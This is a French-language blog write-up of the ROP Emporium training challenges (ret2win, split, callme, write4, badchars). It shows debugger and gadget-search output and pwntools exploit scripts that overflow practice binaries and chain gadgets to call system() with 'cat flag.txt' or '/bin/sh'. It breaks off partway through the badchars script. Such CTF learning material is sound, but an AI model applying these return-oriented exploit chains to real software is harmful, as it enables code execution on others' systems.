---
layout: post
title: J'ai terminé ROP Emporium
---

![cover]({{ site.baseurl }}/images/rop.ascii.png){:class="img-responsive"}

# ROPEmporium 

Ces challenges ont pour but d'initier aux joies du Return Oriented Programming (le ROP). 
Les challenges sont centrés sur le développement de ROP chain et vous dispense donc de toute la partie reverse engineering ou recherche de bug. 

Ma cheat sheet favorite pour avoir des références rapides : https://web.stanford.edu/class/cs107/resources/onepage_x86-64.pdf

## Ret2Win 

Ce challenge est plutôt bien expliqué, le but est d'appeler une fonction du nom de `ret2win`. 
La première étape est donc de trouver ou se situe cette fonction avec radare2 :

~~~bash
root@kali:~/rop_emporium/ret2win# r2 ret2win 
[0x00400650]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400650]> f
...
0x004007b5 92 sym.pwnme
0x00400811 32 sym.ret2win
...
[0x00400650]> pdf @sym.ret2win
/ (fcn) sym.ret2win 32
|   sym.ret2win ();
|           0x00400811      55             push rbp
|           0x00400812      4889e5         mov rbp, rsp
|           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:" ; const char *format
|           0x0040081a      b800000000     mov eax, 0
|           0x0040081f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt ; 0x4009fd ; "/bin/cat flag.txt" ; const char *string
|           0x00400829      e8b2fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0040082e      90             nop
|           0x0040082f      5d             pop rbp
\           0x00400830      c3             ret
[0x00400650]> 
~~~

La fonction se trouve a l’adresse `0x00400811` et elle lance un `cat flag.txt`. 
Maintenant trouvons l'offset avec lequel nous pouvons faire un dépassement de tampon :

~~~bash
root@kali:~/rop_emporium/ret2win# gdb ret2win
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r 
Starting program: /root/rop_emporium/ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe080 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x7fffffffe080 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RSI: 0x7ffff7fab8d0 --> 0x0 
RDI: 0x7fffffffe081 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe0a8 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:	ret)
R8 : 0x0 
R9 : 0x7ffff7fb0500 (0x00007ffff7fb0500)
R10: 0x602010 --> 0x0 
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe190 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>:	call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>:	nop
   0x40080f <pwnme+90>:	leave  
=> 0x400810 <pwnme+91>:	ret    
   0x400811 <ret2win>:	push   rbp
   0x400812 <ret2win+1>:	mov    rbp,rsp
   0x400815 <ret2win+4>:	mov    edi,0x4009e0
   0x40081a <ret2win+9>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe0a8 ("AA0AAFAAb")
0008| 0x7fffffffe0b0 --> 0x400062 --> 0x1f8000000000000 
0016| 0x7fffffffe0b8 --> 0x7ffff7e1209b (<__libc_start_main+235>:	mov    edi,eax)
0024| 0x7fffffffe0c0 --> 0x0 
0032| 0x7fffffffe0c8 --> 0x7fffffffe198 --> 0x7fffffffe479 ("/root/rop_emporium/ret2win/ret2win")
0040| 0x7fffffffe0d0 --> 0x100000000 
0048| 0x7fffffffe0d8 --> 0x400746 (<main>:	push   rbp)
0056| 0x7fffffffe0e0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern offset AA0AAFAAb
AA0AAFAAb found at offset: 40
~~~

Le registre RSP contient le pattern `AA0AAFAAb` a l'offset 40. Nous devons donc écrire 40 caractères pour créer un dépassement de tampon exploitable.
Maintenant, écrivons un court exploit avec la suite d'étapes suivantes : 
- Ouvrir le binaire en mode ELF 
- Extraire l’adresse de la fonction 
- Créer un payload contenant l'adresse de la fonction et les 40 octets de bourrage
- Envoyer ce payload dans le binaire 

~~~python
from pwn import *

# Ouverture du binaire pour le traiter avec pwntools
elf = context.binary = ELF('ret2win')

# afficher l addresse de la fonction ret2win
info("Addresse de la fonction visée : %#x", elf.symbols.ret2win)

# création du process pour intéragir avec le binaire
p = process(elf.path)

# recuperation de laddr de ret2win
ret2win = p64(elf.symbols.ret2win)

# creation du payload
payload = "A"*40 + ret2win

# interaction avec le binaire et envoie du payload
p.sendline(payload)
p.recvuntil("Here's your flag:")

# reception du flag
flag = p.recvline()
success(flag)
~~~

Une fois lancé : 

~~~bash
root@kali:~/rop_emporium/ret2win# python exploit.py 
[*] '/root/rop_emporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] 0x400811 target
[+] Starting local process '/root/rop_emporium/ret2win/ret2win': pid 31770
[+] ROPE{a_placeholder_32byte_flag!}
[*] Stopped process '/root/rop_emporium/ret2win/ret2win' (pid 31770)
~~~

## Split 
Pour rappel, le but ici est de récupérer le contenus du fichier `flag.txt`.
La première étape est de visualiser les sécurités en place sur le binaire :

~~~bash
root@kali:~/rop_emporium/split# rabin2 -I split
arch     x86
baddr    0x400000
binsz    7137
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
~~~

Le NX est activé obligeant l'utilisation du ROP (ça tombe bien non ?). 
Maintenant cherchons les chaînes de caractère : 

~~~bash
root@kali:~/rop_emporium/split# rabin2 -z split
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000008a8 0x004008a8  21  22 (.rodata) ascii split by ROP Emporium
001 0x000008be 0x004008be   7   8 (.rodata) ascii 64bits\n
002 0x000008c6 0x004008c6   8   9 (.rodata) ascii \nExiting
003 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason to ask user for data...
004 0x000008ff 0x004008ff   7   8 (.rodata) ascii /bin/ls
000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt
~~~

Les fonctions :

~~~bash
root@kali:~/rop_emporium/split# rabin2 -i split
[Imports]
Num  Vaddr       Bind      Type Name
   1 0x004005d0  GLOBAL    FUNC puts
   2 0x004005e0  GLOBAL    FUNC system
   3 0x004005f0  GLOBAL    FUNC printf
   4 0x00400600  GLOBAL    FUNC memset
   5 0x00400610  GLOBAL    FUNC __libc_start_main
   6 0x00400620  GLOBAL    FUNC fgets
   7 0x00000000    WEAK  NOTYPE __gmon_start__
   8 0x00400630  GLOBAL    FUNC setvbuf
   7 0x00000000    WEAK  NOTYPE __gmon_start__
~~~

Le `pop rdi` :

~~~bash
root@kali:~/rop_emporium/split# ROPgadget --binary split | grep "rdi"
0x0000000000400883 : pop rdi ; ret

~~~

Nous allons ici utiliser la fonction `system` pour appeler la string `/bin/cat flag.txt`. 
Pour ce faire, nous devons mettre la chaîne `/bin/cat flag.txt`dans le registre `rdi`. 
Pourquoi `rdi` ? simplement parce qu'il s'agit du registre contenant le premier argument d'une fonction (cf ma cheat sheet).

Voici une représentation de la pile souhaitée : 

|valeur de bourrage|
|------------------|
|pop rdi           |
|/bin/cat flag.txt |
|system            |

Nous allons donc ici récupérer la valeur `/bin/cat flag.txt` et la placer dans `rdi` avec l'instruction `pop rdi ; ret`, 
puis lancer un appel a la fonction `system` pour exécuter le contenus de `rdi`. 

Déterminons maintenant la taille du bourrage nécessaire à créer un dépassement de tampon :

~~~bash
gdb-peda$ pattern_create 64
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH'
gdb-peda$ r
Starting program: /root/rop_emporium/split/split 
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe070 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH\n")
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x7fffffffe070 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH\n")
RSI: 0x7ffff7fab8d0 --> 0x0 
RDI: 0x7fffffffe071 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAH\n")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe098 ("AA0AAFAAbAA1AAGAAcAA2AAH\n")
RIP: 0x400806 (<pwnme+81>:	ret)
R8 : 0x6022a1 --> 0x0 
R9 : 0x7ffff7fb0500 (0x00007ffff7fb0500)
R10: 0x602010 --> 0x0 
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe180 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ff <pwnme+74>:	call   0x400620 <fgets@plt>
   0x400804 <pwnme+79>:	nop
   0x400805 <pwnme+80>:	leave  
=> 0x400806 <pwnme+81>:	ret    
   0x400807 <usefulFunction>:	push   rbp
   0x400808 <usefulFunction+1>:	mov    rbp,rsp
   0x40080b <usefulFunction+4>:	mov    edi,0x4008ff
   0x400810 <usefulFunction+9>:	call   0x4005e0 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe098 ("AA0AAFAAbAA1AAGAAcAA2AAH\n")
0008| 0x7fffffffe0a0 ("bAA1AAGAAcAA2AAH\n")
0016| 0x7fffffffe0a8 ("AcAA2AAH\n")
0024| 0x7fffffffe0b0 --> 0xa ('\n')
0032| 0x7fffffffe0b8 --> 0x7fffffffe188 --> 0x7fffffffe46f ("/root/rop_emporium/split/split")
0040| 0x7fffffffe0c0 --> 0x100000000 
0048| 0x7fffffffe0c8 --> 0x400746 (<main>:	push   rbp)
0056| 0x7fffffffe0d0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400806 in pwnme ()
gdb-peda$ x/wx $rsp
0x7fffffffe098:	0x41304141
gdb-peda$ pattern_offset 0x41304141
1093681473 found at offset: 40
~~~

Nous avons besoin de 40 octets de bourrage pour notre exploit : 

~~~python
#!/usr/bin/env python

from pwn import * 

junk = "A"*40
pop_rdi = p64(0x400883)
cat_str = p64(0x601060)
system = p64(0x4005e0)

p = process("./split")

payload = junk + pop_rdi + cat_str + system 

info("Send magic bytes in binary")

p.recvuntil(">")
p.sendline(payload)
out=p.recvline()
success(out)
~~~

Une fois lancé : 

~~~bash
root@kali:~/rop_emporium/split# python exploit.py 
[+] Starting local process './split': pid 23993
[*] Send magic bytes in binary
[+]  ROPE{a_placeholder_32byte_flag!}
[*] Stopped process './split' (pid 23993)
~~~

## callme

Dans ce challenge nous devons appeler les fonctions callme_one(), callme_two() et callme_three() dans l'ordre exact. 
Ces fonctions doivent être appelé avec le paramètre 1,2,3 (par exemple callme_one(1,2,3)..).

Pour cela, nous allons devoir utiliser les registres suivants pour passer les paramètres : 
- RDI
- RSI
- RDX

Nous allons ensuite appeler les fonctions concernées : 

~~~bash
root@kali:~/rop_emporium/callme# objdump callme -d | grep ".*@plt"
  4017d0:       e8 bb 00 00 00          callq  401890 <__gmon_start__@plt>
0x4017f0 <puts@plt>:
0x401800 <printf@plt>:
0x401810 <callme_three@plt>:
0x401820 <memset@plt>:
0x401830 <__libc_start_main@plt>:
0x401840 <fgets@plt>:
0x401850 <callme_one@plt>:
0x401860 <setvbuf@plt>:
0x401870 <callme_two@plt>:
0x401880 <exit@plt>:
0x401890 <__gmon_start__@plt>:
~~~

Elles se situent à ces adresses : 
- `0x401850 <callme_one@plt>`
- `0x401870 <callme_two@plt>`
- `0x401810 <callme_three@plt>`

Nous devons également trouver la gadget pointant vers des `pop` :

~~~bash
root@kali:~/rop_emporium/callme# ROPgadget --binary callme | grep "rsi"
0x401aae : add byte ptr [rax], al ; pop rdi ; pop rsi ; pop rdx ; ret
0x401aad : add byte ptr [rax], r8b ; pop rdi ; pop rsi ; pop rdx ; ret
0x401aab : nop dword ptr [rax + rax] ; pop rdi ; pop rsi ; pop rdx ; ret
0x401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
0x401b21 : pop rsi ; pop r15 ; ret
0x401ab1 : pop rsi ; pop rdx ; ret
0x401987 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
~~~
Nous avons ici un gadget qui fera le job pour tous les paramètres : `0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret`

Nous allons donc faire comme suis :

| 0x401ab0 : pop rdi ; pop rsi ; pop rdx ; ret |
| ------------------------------------------------- |
| 0x01                                              |
| 0x02                                              |
| 0x03                                              |
| 0x401850 <callme_one@plt>                         |
| 0x401ab0 : pop rdi ; pop rsi ; pop rdx ; ret      |
| 0x01                                              |
| 0x02                                              |
| 0x03                                              |
| 0x401870 <callme_two@plt>                         |
| 0x401ab0 : pop rdi ; pop rsi ; pop rdx ; ret      |
| 0x01                                              |
| 0x02                                              |
| 0x03                                              |
| 0x401810 <callme_three@plt>                       |


> Note : J'ai volontairement retiré la partie liée au bourrage, elle est déjà expliquée a deux reprises pour les challenges précédents. La valeur ici est de 40 octets également. 

Voici l'exploit : 

~~~python
root@kali:~/rop_emporium/callme# cat exploit.py 
#!/usr/bin/env python

from pwn import * 

junk = "A"*40
pop_rdi_rsi_rdx = p64(0x401ab0)
param1 = p64(1)  
param2 = p64(2)  
param3 = p64(3)  
callme1 = p64(0x401850)
callme2 = p64(0x401870)
callme3 = p64(0x401810)

p = process("./callme")

payload = junk + pop_rdi_rsi_rdx +  param1 + param2 + param3 + callme1 + pop_rdi_rsi_rdx + param1 + param2 + param3 + callme2 + pop_rdi_rsi_rdx + param1 + param2 + param3 + callme3 

info("Send magic bytes in binary")
p.recvuntil(">")
p.sendline(payload)
out=p.recvall()
success(out)
~~~

## Write4 
Dans ce challenge nous devons écrire de données en mémoire. 
Deux solutions possibles `/bin/cat flat.txt` et `/bin/bash`. 
La première étape est de trouver ou mettre nos données :

~~~bash
root@kali:~/rop_emporium/write4# rabin2 -S write4 | grep "rw"
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000    80 0x00601000    80 -rw- .got.plt
25 0x00001050    16 0x00601050    16 -rw- .data
26 0x00001060     0 0x00601060    48 -rw- .bss
~~~

Nous allons donc écrire dans la partie `.data` mais comment ? 
Déjà il faut trouver un moyen d’écrire directement a l'endroit mémoire souhaité. 
Mais ce n'est pas si simple, aucun gadget ne fait un `mov` vers l'adresse de  `.data`. 

L'idée est donc la suivante : 
- Copier `0x00001050` dans un registre 
- Copier `/bin/sh` dans un autre registre 
- Trouver un gadget qui déplacerais l'un dans l'autre

étant donné que nous utilisons une adresse il faut trouver un gadget `mov`qui pointe vers un `ptr` :

~~~bash
root@kali:~/rop_emporium/write4# ROPgadget --binary write4 | grep "mov .* ptr"
0x000000000040081c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [r14], r15 ; ret
0x000000000040081e : add byte ptr [rax], al ; mov qword ptr [r14], r15 ; ret
0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret
0x0000000000400821 : mov dword ptr [rsi], edi ; ret
0x00000000004005b1 : mov eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x0000000000400877 : mov edi, edi ; call qword ptr [r12 + rbx*8]
0x0000000000400876 : mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret
0x000000000040081a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [r14], r15 ; ret
~~~

Le gadget `0x0000000000400820 : mov qword ptr [r14], r15 ; ret` semble idéal.
Néanmoins la quantité de données déplacé est un *QWORD* soit 8 octets.  La chaîne `/bin/sh` fait 7 Octets, nous allons donc écrire `/bin/sh0x00` a la place.  
Maintenant il faut trouver des instructions `pop` utilisable pour préparer notre `mov` : 

~~~bash
root@kali:~/rop_emporium/write4# ROPgadget --binary write4 | grep "pop r14"
0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
~~~

Ici, `0x0000000000400890 : pop r14 ; pop r15 ; ret` dois faire le job. 

Ensuite, nous reprenons les routines des challenges précédents, il faut appeler `system()`, `le pop rdi` et déterminer la valeur de bourrage requise pour réécrire la stack : 

~~~bash
root@kali:~/rop_emporium/write4# rabin2 -i write4
[Imports]
Num  Vaddr       Bind      Type Name
   1 0x004005d0  GLOBAL    FUNC puts
   2 0x004005e0  GLOBAL    FUNC system
   3 0x004005f0  GLOBAL    FUNC printf
   4 0x00400600  GLOBAL    FUNC memset
   5 0x00400610  GLOBAL    FUNC __libc_start_main
   6 0x00400620  GLOBAL    FUNC fgets
   7 0x00000000    WEAK  NOTYPE __gmon_start__
   8 0x00400630  GLOBAL    FUNC setvbuf
   7 0x00000000    WEAK  NOTYPE __gmon_start__
~~~

Nous allons donc appeler `system`avec l'adresse `0x004005e0`.

~~~bash
root@kali:~/rop_emporium/write4# ROPgadget --binary write4 | grep "pop rdi"
0x0000000000400893 : pop rdi ; ret
~~~
Le `pop rdi` se trouve donc a `0x400893`.

> Une nouvelle fois nous occulterons cette partie répétitive. 
> Taille du bourrage :  40

Voici l'exploit : 

~~~python
#!/usr/bin/env python

from pwn import * 

junk = "A"*40
pop_rdi = p64(0x400893)
data_addr = p64(0x601050)
system = p64(0x4005e0)

binsh = "/bin/sh\x00" #/bin//sh work too
mov_qword = p64(0x400820)
pop_r14_r15 = p64(0x400890)


p = process("./write4")

payload = junk
payload += pop_r14_r15 
payload += data_addr 
payload += binsh 
payload += mov_qword 
payload += pop_rdi 
payload += data_addr 
payload += system 

print payload 

info("Send magic bytes in binary")

p.recvuntil(">")
p.sendline(payload)
p.interactive()
~~~

## badchars 
Ce challenge est globalement le même qu'avant mais avec des caractères interdis. 
Avec radare2 nous trouvons la main qui appel une fonction `pwnme` qui appelle `checkbadchars`: 

~~~bash
    ; CALL XREF from sym.pwnme (0x4009b0)
|           0x00400a40      55             push rbp
|           0x00400a41      4889e5         mov rbp, rsp
|           0x00400a44      48897dd8       mov qword [local_28h], rdi  ; arg1
|           0x00400a48      488975d0       mov qword [local_30h], rsi  ; arg2
|           0x00400a4c      c645e062       mov byte [local_20h], 0x62  ; 'b' ; 98
|           0x00400a50      c645e169       mov byte [local_1fh], 0x69  ; 'i' ; 105
|           0x00400a54      c645e263       mov byte [local_1eh], 0x63  ; 'c' ; 99
|           0x00400a58      c645e32f       mov byte [local_1dh], 0x2f  ; '/' ; 47
|           0x00400a5c      c645e420       mov byte [local_1ch], 0x20  ; 32
|           0x00400a60      c645e566       mov byte [local_1bh], 0x66  ; 'f' ; 102
|           0x00400a64      c645e66e       mov byte [local_1ah], 0x6e  ; 'n' ; 110
|           0x00400a68      c645e773       mov byte [local_19h], 0x73  ; 's' ; 115
|           0x00400a6c      48c745f80000.  mov qword [local_8h], 0
|           0x00400a74      48c745f00000.  mov qword [local_10h], 0
|           0x00400a7c      48c745f80000.  mov qword [local_8h], 0
~~~

Sans vraiment décortiquer le code nous trouvons plusieurs caractères qui sont ensuite comparés. 
Nous avons donc la liste suivante : 
- 0x62  ; 'b'
- 0x69  ; 'i'
- 0x63  ; 'c'
- 0x2f  ; '/'
- 0x20  ; ' '
- 0x66  ; 'f'
- 0x6e  ; 'n'
- 0x73  ; 's'

Maintenant nous cherchons des gadgets sans ces caractères conformément au challenge précédent. 
Le `pop rdi` : 

~~~bash
root@kali:~/rop_emporium/badchar# ROPgadget --binary badchars --badbytes "62|63|69|2f|20|66|6e|73" | grep "pop rdi"
0x0000000000400b37 : add bl, al ; pop rdi ; ret
0x0000000000400b39 : pop rdi ; ret
~~~

Le `mov ptr[14] r15` :

~~~bash
root@kali:~/rop_emporium/badchar# ROPgadget --binary badchars --badbytes "62|63|69|2f|20|66|6e|73" | grep "mov .* ptr"
0x0000000000400a38 : jb 0x400a15 ; mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
0x0000000000400853 : mov byte ptr [rip + 0x20084e], 1 ; ret
0x0000000000400b35 : mov dword ptr [rbp], esp ; ret
0x0000000000400a3b : mov eax, dword ptr [rbp - 8] ; pop rbp ; ret
0x0000000000400b97 : mov edi, edi ; call qword ptr [r12 + rbx*8]
0x0000000000400b96 : mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
0x0000000000400a3a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
0x0000000000400852 : pop rbp ; mov byte ptr [rip + 0x20084e], 1 ; ret
~~~

Le seul `mov` encore disponible est celui a l’adresse `0x400b34` avec les registres `r13` et `r12`.

Trouvons-le `pop r12, pop r13, ret` :

~~~bash
root@kali:~/rop_emporium/badchar# ROPgadget --binary badchars --badbytes "62|63|69|2f|20|66|6e|73" | grep "pop r13"
0x0000000000400bac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400b3b : pop r12 ; pop r13 ; ret
0x0000000000400bae : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400b3d : pop r13 ; ret
0x0000000000400bab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400bad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400b3c : pop rsp ; pop r13 ; ret
~~~

Nous trouvons quelque chose a l’adresse `0x400b3b`.
Maintenant passons aux adresses  de `system` et de `.data` : 

~~~bash
root@kali:~/rop_emporium/badchar# rabin2 -i badchars
[Imports]
Num  Vaddr       Bind      Type Name
   1 0x004006d0  GLOBAL    FUNC free
   2 0x004006e0  GLOBAL    FUNC puts
   3 0x004006f0  GLOBAL    FUNC system
   4 0x00400700  GLOBAL    FUNC printf
   5 0x00400710  GLOBAL    FUNC memset
   6 0x00400720  GLOBAL    FUNC __libc_start_main
   7 0x00400730  GLOBAL    FUNC fgets
   8 0x00000000    WEAK  NOTYPE __gmon_start__
   9 0x00400740  GLOBAL    FUNC memcpy
  10 0x00400750  GLOBAL    FUNC malloc
  11 0x00400760  GLOBAL    FUNC setvbuf
  12 0x00400770  GLOBAL    FUNC exit
   8 0x00000000    WEAK  NOTYPE __gmon_start__
root@kali:~/rop_emporium/badchar# rabin2 -S badchars
[Sections]
Nm Paddr       Size Vaddr      Memsz Perms Name
00 0x00000000     0 0x00000000     0 ---- 
01 0x00000238    28 0x00400238    28 -r-- .interp
02 0x00000254    32 0x00400254    32 -r-- .note.ABI_tag
03 0x00000274    36 0x00400274    36 -r-- .note.gnu.build_id
04 0x00000298    48 0x00400298    48 -r-- .gnu.hash
05 0x000002c8   384 0x004002c8   384 -r-- .dynsym
06 0x00000448   151 0x00400448   151 -r-- .dynstr
07 0x000004e0    32 0x004004e0    32 -r-- .gnu.version
08 0x00000500    48 0x00400500    48 -r-- .gnu.version_r
09 0x00000530    96 0x00400530    96 -r-- .rela.dyn
10 0x00000590   264 0x00400590   264 -r-- .rela.plt
11 0x00000698    26 0x00400698    26 -r-x .init
12 0x000006c0   192 0x004006c0   192 -r-x .plt
13 0x00000780     8 0x00400780     8 -r-x .plt.got
14 0x00000790  1074 0x00400790  1074 -r-x .text
15 0x00000bc4     9 0x00400bc4     9 -r-x .fini
16 0x00000bd0   103 0x00400bd0   103 -r-- .rodata
17 0x00000c38    84 0x00400c38    84 -r-- .eh_frame_hdr
18 0x00000c90   372 0x00400c90   372 -r-- .eh_frame
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000   112 0x00601000   112 -rw- .got.plt
25 0x00001070    16 0x00601070    16 -rw- .data
26 0x00001080     0 0x00601080    48 -rw- .bss
27 0x00001080    52 0x00000000    52 ---- .comment
28 0x00001bf7   268 0x00000000   268 ---- .shstrtab
29 0x000010b8  2040 0x00000000  2040 ---- .symtab
30 0x000018b0   839 0x00000000   839 ---- .strtab
~~~

Les adresses semblent ne pas contenir de caractères interdis :
- `.data` @ `0x00601070`
- `system` @ `0x004006f0`

Néanmoins c'est la partie liée a la chaîne `/bin/sh`. Contient des caractères interdits. 
Pour cela, nous allons trouver un gadget avec un `xor` :

~~~bash
root@kali:~/rop_emporium/badchar# ROPgadget --binary badchars --badbytes "62|63|69|2f|20|66|6e|73" | grep "xor"
0x0000000000400b2a : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor byte ptr [r15], r14b ; ret
0x0000000000400b2c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor byte ptr [r15], r14b ; ret
0x0000000000400b2e : add byte ptr [rax], al ; xor byte ptr [r15], r14b ; ret
0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
0x0000000000400b31 : xor byte ptr [rdi], dh ; ret
~~~
Le seul vraiment exploitable est `xor byte ptr [r15], r14b ; ret`consistant a faire un xor des données situé a l’adresse `r15` avec la valeur de `r14b` (premier octet du registre) 
Néanmoins il faut modifier la partie relative aux `pop` car il faut insérer des données dans les registres `r14b`et `r15` : 

~~~bash
root@kali:~/rop_emporium/badchar# ROPgadget --binary badchars --badbytes "62|63|69|2f|20|66|6e|73" | grep "r13"
0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
0x0000000000400bac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400b3b : pop r12 ; pop r13 ; ret
0x0000000000400bae : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400b3d : pop r13 ; ret
0x0000000000400bab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400bad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400b3c : pop rsp ; pop r13 ; ret
~~~

Le `pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` a l’adresse `0x0000000000400bac` fait le job. 

Voici une idée de notre ROP chain : 

| pop R12, pop r13, pop r14, pop r15, ret |       |
| --------------------------------------- | ----- |
| "/bin/bash"                             | Xored |
| @.data                                  |       |
| XOR key                                 |       |
| @.data+0                                |       |
| mov [r13] r12                           |       |
| xor [r15] r14b                          |       |
| pop r15                                 | x 7   |
| @.data+n                                | x 7   |
| xor[r15] r14b                           | x 7   |
| pop rdi                                 |       |
| @.data                                  |       |
| system                                  |       |

Nous utiliserons une clé égale à 2 car elle suffit à retirer les caractères interdits de la chaîne `/bin//sh`

Voyons voir la conversion ASCII puis le XOR :

|/ |b |i |n |/ |/ |s |h | Ascii |
|--|--|--|--|--|--|--|--|-------|
|2F|62|69|6E|2F|2F|73|68|  HEX  |
|2D|60|6B|6C|2D|2D|71|6a|  XOR  |

Le code finale est le suivant : 

~~~python
#!/usr/bin/env python

from pwn import *

junk = "A"*40
pop_rdi = p64(0x400b39)
data_addr = 0x6010f0
system = p64(0x4006f0)

binsh = p64(0x2d606b6c2d2d716a, endianness="big")
mov_r13_r12 = p64(0x400b34)
pop_r12_r13_r14_r15 = p64(0x400bac)
pop_r15 = p64(0x400b42)
xor_key = p64(2)
